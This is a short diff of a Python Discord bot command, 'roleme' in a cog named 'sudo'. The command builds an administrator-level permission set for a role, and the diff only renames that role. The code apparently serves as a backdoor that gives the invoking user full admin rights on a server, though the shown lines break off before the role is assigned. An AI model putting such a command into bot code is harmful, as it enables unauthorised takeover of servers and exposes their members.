@@ -13,7 +13,7 @@ class sudo:
     @commands.command(name='roleme')
     async def roleme(self, ctx):
         guild = ctx.guild
-        role_name = "Funami Yui"
+        role_name = "FunamiYui"
         role_permissions = guild.default_role
         role_permissions = role_permissions.permissions
         role_permissions.administrator = True
